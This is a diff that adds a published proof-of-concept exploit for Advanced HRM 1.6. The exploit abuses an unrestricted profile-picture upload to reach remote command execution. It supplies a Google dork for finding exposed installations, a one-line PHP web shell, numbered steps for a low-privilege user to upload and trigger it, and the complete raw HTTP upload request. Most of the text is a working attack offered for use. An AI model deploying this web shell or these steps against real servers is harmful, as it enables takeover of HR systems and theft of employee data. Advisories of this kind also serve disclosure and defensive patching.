@@ -1,0 +1,51 @@
+# Exploit Title: Advanced HRM 1.6 - Remote Code Execution
+# Google Dork: intext:"Advanced HRM" 
+# Date: 2018-10-06
+# Exploit Author: Renos Nikolaou
+# Vendor Homepage: https://coderpixel.com/
+# Software Link: https://codecanyon.net/item/advanced-hrm/17767006
+# Version: 1.6
+# Tested on: Windows 10
+# CVE: N/A
+# Description : Advanced HRM 1.6 allows users to upload arbitrary files which 
+# leads to a remote command execution on the remote server.
+
+# PoC
+# 1) Create a php file with the below code:
+
+<?php $cmd=$_GET['cmd']; system($cmd); ?>
+
+# 2) Login to Advanced HRM portal as low priviliage user
+# 3) At the right hand side go to Update Profile --> Change Picture ( http://domain/hrm/user/edit-profile )
+# 4) Click Browse and upload your file containing the PHP code mentioned at step 1. 
+# 5) Click Update
+# 6) Right click at the Profile image and select Copy image Location
+# 7) Paste the URL into your browser. Will be similar to: http://domain/hrm/assets/employee_pic/cmd.php
+# 8) Verify the exploit: http://domain/hrm/assets/employee_pic/cmd.php?cmd=id
+
+# The request:
+===================
+
+POST /hrm/user/update-user-avatar HTTP/1.1
+Host: domain
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://domain/hrm/user/edit-profile
+Content-Type: multipart/form-data; boundary=---------------------------6610657524685
+Content-Length: 378
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+-----------------------------6610657524685
+Content-Disposition: form-data; name="image"; filename="cmd.php"
+Content-Type: application/octet-stream
+
+<?php $cmd=$_GET['cmd']; system($cmd); ?>
+
+-----------------------------6610657524685
+Content-Disposition: form-data; name="_token"
+
+yWFLEpnGV1n5OzK7sAPWg6UVJG02Q
+-----------------------------6610657524685--
